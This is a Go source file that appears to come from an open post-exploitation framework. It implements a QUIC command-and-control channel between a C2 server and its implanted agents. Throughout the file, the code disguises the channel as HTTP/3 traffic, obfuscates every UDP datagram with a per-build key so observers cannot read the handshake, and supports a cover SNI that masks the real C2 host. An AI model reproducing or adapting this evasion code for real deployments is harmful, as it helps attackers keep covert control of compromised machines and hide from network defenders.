//go:build with_quic

// This file implements the QUIC C2 transport: a QUIC byte-stream channel whose
// UDP datagrams are optionally obfuscated with a per-build static key.
//
// Why obfuscate at the datagram layer instead of changing the QUIC Initial
// salt: the RFC 9001 Initial salt is a compile-time constant inside the QUIC
// implementation, so a custom salt would require forking quic-go. Wrapping the
// net.PacketConn with a keyed transform achieves the same goal (a passive
// observer cannot recover the Initial payload / ClientHello) for every QUIC
// packet, not just the Initial, and keeps the QUIC stack stock. With
// QUICStandardKey set the wrapper is skipped and the transport is stock QUIC,
// which interoperates with arbitrary QUIC/HTTP3 peers.

package transport

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/quic-go/quic-go"
	"golang.org/x/crypto/blake2b"
)

const (
	// QUICALPN is the ALPN advertised by the C2 QUIC transport. It mirrors
	// HTTP/3 so the handshake is indistinguishable from ordinary H3 traffic.
	QUICALPN = "h3"

	// quicObfsSaltLen is the per-datagram nonce prepended by the obfuscator.
	// The transform is length-preserving apart from these bytes, so it costs
	// far less MTU headroom than an AEAD wrapper would.
	quicObfsSaltLen = 8

	// quicDatagramSize bounds a single obfuscated datagram. QUIC never emits
	// more than ~1452 bytes of payload, so 2 KiB is ample headroom.
	quicDatagramSize = 2048
)

// quicStandardKey is the runtime opt-out. It is set from the agent/C2 config
// before any QUIC connection is made.
var quicStandardKey atomic.Bool

// SetQUICStandardKey selects stock QUIC (no datagram obfuscation). It is a
// no-op in builds that exclude the QUIC transport.
func SetQUICStandardKey(standard bool) {
	quicStandardKey.Store(standard)
}

// QUICStaticKey derives the shared key used to obfuscate QUIC datagrams. It
// returns nil when obfuscation is disabled (stock QUIC). The seed is the
// build-time QUICKey, falling back to the build-time MagicString, so a C2 and
// its agents built from the same batch always agree.
func QUICStaticKey() []byte {
	if quicStandardKey.Load() {
		return nil
	}
	seed := def.QUICKey
	if seed == "" {
		seed = def.MagicString
	}
	if seed == "" {
		return nil
	}
	// Hash the seed directly: the seed is either the build-time QUICKey or
	// MagicString, both unique random per build, so no domain label is needed
	// (and none that could identify the payload is embedded).
	sum := sha256.Sum256([]byte(seed))
	return sum[:]
}

// quicObfuscator applies the length-preserving datagram transform
// out[i] = in[i] ^ BLAKE2b-256(psk || salt)[i mod 32], prefixed with the
// 8-byte salt. It is not an AEAD: QUIC authenticates every packet itself, and
// the keyed XOR only has to stop a passive observer from reading the Initial
// (i.e. the TLS ClientHello). The scratch buffer makes each call allocation
// free; callers must serialize access (one instance per direction).
type quicObfuscator struct {
	psk      []byte
	keyInput []byte
}

func newQUICObfuscator(psk []byte) *quicObfuscator {
	keyInput := make([]byte, len(psk)+quicObfsSaltLen)
	copy(keyInput, psk)
	return &quicObfuscator{psk: psk, keyInput: keyInput}
}

func (o *quicObfuscator) stream(salt []byte) [blake2b.Size256]byte {
	copy(o.keyInput[len(o.psk):], salt)
	return blake2b.Sum256(o.keyInput)
}

// obfuscate writes [salt][xor(in)] to dst and returns the written slice.
func (o *quicObfuscator) obfuscate(dst, in []byte) []byte {
	dst = dst[:0]
	var salt [quicObfsSaltLen]byte
	if _, err := rand.Read(salt[:]); err != nil {
		// crypto/rand never fails in practice; fail closed by emitting nothing
		// so the caller drops the datagram instead of sending it in the clear.
		return dst
	}
	dst = append(dst, salt[:]...)
	key := o.stream(salt[:])
	for i, b := range in {
		dst = append(dst, b^key[i%blake2b.Size256])
	}
	return dst
}

// deobfuscate unwraps [salt][xor(in)] into dst and returns the decoded slice.
// It returns nil when the datagram is too short to carry a salt. The result may
// be a fresh slice when dst has no room, so callers must use the return value.
func (o *quicObfuscator) deobfuscate(dst, in []byte) []byte {
	if len(in) <= quicObfsSaltLen {
		return nil
	}
	salt := in[:quicObfsSaltLen]
	payload := in[quicObfsSaltLen:]
	if cap(dst) < len(payload) {
		dst = make([]byte, len(payload))
	} else {
		dst = dst[:len(payload)]
	}
	key := o.stream(salt)
	for i, b := range payload {
		dst[i] = b ^ key[i%blake2b.Size256]
	}
	return dst
}

// quicObfsConn is a net.PacketConn that transparently obfuscates every
// datagram. It deliberately does not expose SyscallConn: quic-go disables GSO
// on such conns, which is required because a GSO batch could not be keyed per
// segment.
type quicObfsConn struct {
	net.PacketConn
	read     *quicObfuscator
	write    *quicObfuscator
	readMu   sync.Mutex
	writeMu  sync.Mutex
	readBuf  []byte
	writeBuf []byte
}

func wrapQUICPacketConn(conn net.PacketConn, psk []byte) net.PacketConn {
	return &quicObfsConn{
		PacketConn: conn,
		read:       newQUICObfuscator(psk),
		write:      newQUICObfuscator(psk),
		readBuf:    make([]byte, quicDatagramSize),
		writeBuf:   make([]byte, quicDatagramSize),
	}
}

func (c *quicObfsConn) ReadFrom(p []byte) (int, net.Addr, error) {
	c.readMu.Lock()
	defer c.readMu.Unlock()
	for {
		n, addr, err := c.PacketConn.ReadFrom(c.readBuf)
		if n <= 0 {
			return n, addr, err
		}
		plain := c.read.deobfuscate(p[:0], c.readBuf[:n])
		if len(plain) == 0 {
			// A datagram that does not carry our salt is dropped: stock QUIC
			// peers sharing the port must not be interpreted as ours.
			continue
		}
		if len(plain) > len(p) {
			// Caller's buffer cannot hold the decoded packet; drop it rather
			// than return a truncated QUIC packet.
			continue
		}
		// deobfuscate may have had to allocate; copy into the caller's buffer.
		copy(p, plain)
		return len(plain), addr, nil
	}
}

func (c *quicObfsConn) WriteTo(p []byte, addr net.Addr) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	out := c.write.obfuscate(c.writeBuf, p)
	if len(out) == 0 {
		return 0, errors.New("quic obfuscate: random source failed")
	}
	if _, err := c.PacketConn.WriteTo(out, addr); err != nil {
		return 0, err
	}
	return len(p), nil
}

// SetReadBuffer/SetWriteBuffer forward to the underlying UDP socket so quic-go
// can grow the kernel buffers. They are deliberately the only UDP-specific
// methods exposed: SyscallConn stays hidden so GSO is disabled (a GSO batch
// cannot be keyed per segment).
func (c *quicObfsConn) SetReadBuffer(n int) error {
	if u, ok := c.PacketConn.(interface{ SetReadBuffer(int) error }); ok {
		return u.SetReadBuffer(n)
	}
	return nil
}

func (c *quicObfsConn) SetWriteBuffer(n int) error {
	if u, ok := c.PacketConn.(interface{ SetWriteBuffer(int) error }); ok {
		return u.SetWriteBuffer(n)
	}
	return nil
}

// packetConnFor returns a possibly obfuscated packet conn. It returns the raw
// conn unchanged (preserving GSO/ECN optimizations) when the static key is
// disabled.
func packetConnFor(conn net.PacketConn, key []byte) net.PacketConn {
	if len(key) == 0 {
		return conn
	}
	return wrapQUICPacketConn(conn, key)
}

// QUICStream is a single bidirectional QUIC stream presented as a byte stream.
// Client streams own their connection and socket; server streams do not (the
// listener owns them), so closing a server stream only sends FIN and lets the
// peer drain the final frames before the connection is reaped.
type QUICStream struct {
	stream    *quic.Stream
	conn      *quic.Conn
	transport *quic.Transport // client-side only
	pc        net.PacketConn  // client-side socket
	ownsConn  bool
	remote    string
}

func (s *QUICStream) Read(p []byte) (int, error)  { return s.stream.Read(p) }
func (s *QUICStream) Write(p []byte) (int, error) { return s.stream.Write(p) }

func (s *QUICStream) Close() error {
	err := s.stream.Close()
	if !s.ownsConn {
		return err
	}
	if s.conn != nil {
		_ = s.conn.CloseWithError(0, "")
	}
	if s.transport != nil {
		_ = s.transport.Close()
	}
	if s.pc != nil {
		_ = s.pc.Close()
	}
	return err
}

// RemoteAddrString implements the StreamTransport address contract.
func (s *QUICStream) RemoteAddrString() string { return s.remote }

// LocalAddr/RemoteAddr/deadline stubs keep QUICStream usable where a net.Conn
// is expected; the QUIC layer owns deadlines at the stream level.
func (s *QUICStream) LocalAddr() net.Addr             { return nil }
func (s *QUICStream) RemoteAddr() net.Addr            { return nil }
func (s *QUICStream) SetDeadline(time.Time) error     { return nil }
func (s *QUICStream) SetReadDeadline(time.Time) error { return nil }
func (s *QUICStream) SetWriteDeadline(time.Time) error {
	return nil
}

// QUICListener accepts QUIC connections on an obfuscated or stock UDP socket.
type QUICListener struct {
	listener  *quic.Listener
	transport *quic.Transport
	pc        net.PacketConn
}

// ListenQUIC binds a UDP socket on addr and starts a QUIC listener. When key
// is non-empty every datagram is obfuscated with it.
func ListenQUIC(addr string, tlsCfg *tls.Config, key []byte) (*QUICListener, error) {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("resolve quic listen address %q: %w", addr, err)
	}
	rawConn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return nil, fmt.Errorf("listen quic udp %q: %w", addr, err)
	}
	pc := packetConnFor(rawConn, key)
	tr := &quic.Transport{Conn: pc, ConnectionIDLength: 12}
	listener, err := tr.Listen(tlsCfg, quicConfig())
	if err != nil {
		_ = pc.Close()
		return nil, fmt.Errorf("listen quic %q: %w", addr, err)
	}
	return &QUICListener{listener: listener, transport: tr, pc: pc}, nil
}

// Addr returns the local UDP address the listener is bound to.
func (l *QUICListener) Addr() net.Addr { return l.pc.LocalAddr() }

// QUICConn is a server-accepted QUIC connection.
type QUICConn struct {
	conn *quic.Conn
}

// Accept returns the next inbound QUIC connection. Callers must accept its
// stream (and close it) in their own goroutine so a peer that connects without
// opening a stream cannot stall the accept loop.
func (l *QUICListener) Accept(ctx context.Context) (*QUICConn, error) {
	conn, err := l.listener.Accept(ctx)
	if err != nil {
		return nil, err
	}
	return &QUICConn{conn: conn}, nil
}

// AcceptStream accepts the connection's first bidirectional stream.
func (c *QUICConn) AcceptStream(ctx context.Context) (*QUICStream, error) {
	stream, err := c.conn.AcceptStream(ctx)
	if err != nil {
		return nil, err
	}
	return &QUICStream{stream: stream, conn: c.conn, remote: c.conn.RemoteAddr().String()}, nil
}

// Close closes the connection with a normal application error.
func (c *QUICConn) Close() error { return c.conn.CloseWithError(0, "") }

// Wait blocks until the peer closes the connection or ctx expires. Callers use
// it after the dispatcher closes the stream so a graceful peer close is
// observed before the connection is forcibly reaped.
func (c *QUICConn) Wait(ctx context.Context) error {
	select {
	case <-c.conn.Context().Done():
		return c.conn.Context().Err()
	case <-ctx.Done():
		return ctx.Err()
	}
}

// RemoteAddrString returns the peer's address, for logs and rate limiting.
func (c *QUICConn) RemoteAddrString() string { return c.conn.RemoteAddr().String() }

// AcceptStream accepts one QUIC connection and its first bidirectional stream.
// It is a convenience for tests and single-shot clients; the server uses
// Accept plus a per-connection goroutine to keep the accept loop live.
func (l *QUICListener) AcceptStream(ctx context.Context) (*QUICStream, error) {
	conn, err := l.Accept(ctx)
	if err != nil {
		return nil, err
	}
	stream, err := conn.AcceptStream(ctx)
	if err != nil {
		_ = conn.Close()
		return nil, err
	}
	return stream, nil
}

// Close stops accepting and closes the UDP socket.
func (l *QUICListener) Close() error {
	err := l.listener.Close()
	_ = l.transport.Close()
	_ = l.pc.Close()
	return err
}

func quicConfig() *quic.Config {
	return &quic.Config{
		HandshakeIdleTimeout: 8 * time.Second,
		MaxIdleTimeout:       5 * time.Minute,
		KeepAlivePeriod:      20 * time.Second,
		MaxIncomingStreams:   32,
		Allow0RTT:            false,
	}
}

// QUICTLSConfig builds the crypto/tls config for a QUIC client dialing the C2
// host. It mirrors the HTTP transport: trust the embedded C2 CA, optionally
// present a cover SNI while still verifying against the real C2 host.
func QUICTLSConfig(c2Host string) (*tls.Config, error) {
	caPEM := GetCACrtPEM()
	rootCAs, err := ExtractCABundle(caPEM)
	if err != nil {
		return nil, fmt.Errorf("extract CA bundle: %w", err)
	}
	if ok := rootCAs.AppendCertsFromPEM(caPEM); !ok {
		return nil, errors.New("no CA certs appended")
	}
	sni, verifyName := c2ServerNames(c2Host)
	cfg := &tls.Config{
		ServerName:       sni,
		RootCAs:          rootCAs,
		MinVersion:       tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.X25519},
		NextProtos:       []string{QUICALPN},
	}
	if verifyName != "" {
		cfg.InsecureSkipVerify = true
		cfg.VerifyConnection = func(cs tls.ConnectionState) error {
			opts := x509.VerifyOptions{
				DNSName:       verifyName,
				Roots:         rootCAs,
				Intermediates: x509.NewCertPool(),
			}
			for _, cert := range cs.PeerCertificates[1:] {
				opts.Intermediates.AddCert(cert)
			}
			_, err := cs.PeerCertificates[0].Verify(opts)
			return err
		}
	}
	return cfg, nil
}

// dialQUIC opens a QUIC connection to rawURL and returns its first
// bidirectional stream.
func dialQUIC(ctx context.Context, rawURL string, key []byte) (*QUICStream, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("parse quic c2 url %q: %w", rawURL, err)
	}
	host := u.Hostname()
	if host == "" {
		return nil, fmt.Errorf("quic c2 url %q has no host", rawURL)
	}
	port := u.Port()
	if port == "" {
		port = "443"
	}
	tlsCfg, err := QUICTLSConfig(host)
	if err != nil {
		return nil, err
	}
	rawConn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil, fmt.Errorf("open quic socket: %w", err)
	}
	pc := packetConnFor(rawConn, key)
	tr := &quic.Transport{Conn: pc, ConnectionIDLength: 12}
	addr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(host, port))
	if err != nil {
		_ = pc.Close()
		return nil, fmt.Errorf("resolve quic c2 address: %w", err)
	}
	conn, err := tr.Dial(ctx, addr, tlsCfg, quicConfig())
	if err != nil {
		_ = pc.Close()
		return nil, fmt.Errorf("dial quic c2: %w", err)
	}
	stream, err := conn.OpenStreamSync(ctx)
	if err != nil {
		_ = conn.CloseWithError(0, "")
		_ = pc.Close()
		return nil, fmt.Errorf("open quic stream: %w", err)
	}
	return &QUICStream{stream: stream, conn: conn, transport: tr, pc: pc, ownsConn: true, remote: conn.RemoteAddr().String()}, nil
}

// quicChannelWrapper adapts the QUIC byte stream to the C2ChannelWrapper
// interface. Accept is intentionally unsupported: the C2 runs a dedicated QUIC
// listener rather than an HTTP handler.
type quicChannelWrapper struct{}

func (quicChannelWrapper) Dial(ctx context.Context, _ *http.Client, rawURL string) (io.ReadWriteCloser, *http.Response, error) {
	stream, err := dialQUIC(ctx, rawURL, QUICStaticKey())
	if err != nil {
		return nil, nil, err
	}
	return stream, nil, nil
}

func (quicChannelWrapper) Accept(http.ResponseWriter, *http.Request) (io.ReadWriteCloser, error) {
	return nil, errors.New("quic accept is handled by StartC2QUICServer")
}

func init() {
	RegisterC2Channel(def.C2ChannelModeQUIC, "QUIC duplex stream wrapper over UDP with a custom static-key datagram obfuscation", quicChannelWrapper{})
}

// compile-time assertions.
var (
	_ io.ReadWriteCloser = (*QUICStream)(nil)
	_ C2ChannelWrapper   = quicChannelWrapper{}
)
